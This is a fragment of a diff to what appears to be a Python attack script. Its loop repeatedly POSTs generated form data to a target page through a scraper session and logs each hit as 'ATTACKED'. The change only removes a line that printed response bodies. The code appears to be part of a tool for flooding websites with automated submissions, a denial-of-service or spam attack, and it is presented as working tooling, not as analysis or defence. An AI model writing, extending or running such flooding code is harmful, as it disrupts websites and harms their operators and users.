@@ -67,7 +67,6 @@ def mainth():
                 for i in range(MAX_REQUESTS):
                     try:
                         response = scraper.post(page, data=generate_MIR_data(site))
-                        print(response.content.decode('utf-8'))
                         logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
                     except Exception as e:
                         logger.error(str(e))
